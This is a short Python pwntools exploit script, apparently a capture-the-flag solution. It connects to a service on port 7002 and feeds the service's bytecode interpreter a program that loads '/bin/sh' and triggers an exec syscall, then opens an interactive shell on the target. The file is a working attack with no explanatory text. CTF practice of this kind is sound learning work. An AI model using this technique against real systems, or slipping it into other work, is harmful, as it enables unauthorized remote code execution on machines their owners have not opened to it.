#!/usr/bin/env python2

import sys

from pwn import *
from constants import *


def main(io):
    payload = [
        # put "/bin"
        OP_SET, 0, 0x6e69622f, 
        # put "/sh\x00"
        OP_SET, 1, 0x0068732f, 
        # execve
        OP_SYS, SYS_EXEC
    ]
    
    io.sendlineafter('Exit\n', '1')
    io.sendlineafter('length:\n', str(len(payload)))
    io.sendlineafter('program:\n', ''.join(p32(c) for c in payload))
    io.sendlineafter('No\n', '1')
    io.interactive()


if __name__ == '__main__':
    io = remote(sys.argv[1], 7002)
    try:
        main(io)
    finally:
        io.close()
